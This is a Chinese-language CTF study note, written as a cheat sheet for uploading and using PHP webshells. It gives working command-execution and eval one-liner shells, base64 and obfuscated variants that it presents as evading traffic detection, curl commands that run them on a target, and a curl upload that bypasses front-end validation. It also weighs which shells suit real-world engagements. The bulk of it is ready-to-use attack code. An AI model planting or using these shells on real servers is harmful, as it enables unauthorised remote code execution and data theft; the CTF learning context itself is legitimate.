# 🗂 Web 笔记 19｜Webshell 速查（命令马 / eval 马 / 前端校验绕过）

> 记录自：qsnctf 上传题（40253）+ LFI 日志包含题 ｜ 2026-08-12
> 适用：文件上传 getshell、LFI 日志包含、任何需要「往服务器放马」的场景

---

## 一、Webshell 三兄弟（先建立分类）

| 类型 | 内容 | 用法 | 场景 |
|---|---|---|---|
| **命令执行马**（system 系） | `<?php system($_GET['c']); ?>` | curl/浏览器直接访问 | 上传 getshell（回显直接） |
| **一句话木马**（eval 系） | `<?php @eval($_POST['x']); ?>` | 配蚁剑/菜刀 | LFI 日志包含、需要复杂操作 |
| **大马** | 完整 PHP 文件 | 浏览器打开有界面 | 功能全面但特征明显 |

---

## 二、命令执行马（保存用 ★）

### ① 最常用（GET 传参，有回显）
```php
<?php system($_GET['c']); ?>
```
```bash
curl "http://靶机/shell.php?c=id"
curl "http://靶机/shell.php?c=ls%20-la%20/"
curl "http://靶机/shell.php?c=cat%20/flag"
```

### ② shell_exec 版（返回完整输出字符串）
```php
<?php echo shell_exec($_GET['c']); ?>
```
```bash
# 用法同上；shell_exec 有返回值，echo 出来
# 适合输出需要完整捕获的场景
```

### 补充变体（知道即可）
```php
<?php passthru($_GET['c']); ?>          // 原始二进制输出
<?php exec($_GET['c']); ?>              // 无回显（要配合 var_dump/输出）
<?php $_GET['c']($_GET['a']); ?>        // 可变函数马: ?c=system&a=id
```

---

## 三、一句话木马（eval 系，保存用 ★）

### ① 最经典（蚁剑默认支持）
```php
<?php @eval($_POST['x']); ?>
```
```text
蚁剑连接: URL=http://靶机/shell.php  密码=x  类型=PHP
```

### ② base64 加密版（防流量特征检测）
```php
<?php @eval(base64_decode($_POST['x'])); ?>
```
```text
蚁剑连接: URL=同上  密码=x  类型=PHP（编码器选 base64 相关）
原理: 蚁剑把代码 base64 后传 → 服务器解码再 eval，流量里没有明文代码
```

### 补充变体
```php
<?php assert($_POST['x']); ?>                    // ⚠️ PHP7+ 失效（assert 不再执行字符串）
<?php eval($_REQUEST['x']); ?>                   // GET/POST 都收
<?php @eval($_POST[base64_decode('eA==')]); ?>   // 密码也加密（eA== = 'x'）
```

---

## 四、前端校验绕过（上传题）

**前端 JS 校验只挡浏览器正常提交**，以下途径全部绕过：

| 途径 | 说明 |
|---|---|
| curl | 直接构造 multipart |
| Burp（Repeater/改包） | 拦截或构造 |
| Python requests | 脚本化 |
| HackBar/Postman | 手动构造 |
| 浏览器 F12 fetch() | 不触发页面 onsubmit |

```bash
# curl 上传马（绕过页面 JS 白名单）
printf '<?php system($_GET["c"]); ?>' > shell.php
curl -F "upload_file=@shell.php" -F "submit=上传" http://靶机/
```

---

## 五、马的选择（CTF vs 实战）

| 场景 | 结论 |
|---|---|
| CTF 靶机 | 无 WAF 无限制，**能连就行** |
| 实战 | 看免杀性（经典马一眼识别）/ 兼容性（assert PHP7 失效）/ 能力范围（eval 能执行任意 PHP）/ disable_functions（system/eval 可能被禁） |

---

## 六、速查卡（贴墙）

```
命令马:   <?php system($_GET['c']); ?>        → curl ?c=id
eval马:   <?php @eval($_POST['x']); ?>        → 蚁剑 密码=x
base64马: <?php @eval(base64_decode($_POST['x'])); ?>  → 防特征
前端校验: 纸老虎，curl/Burp 直接绕
上传后:   看回显路径 → 访问执行 → RCE
```
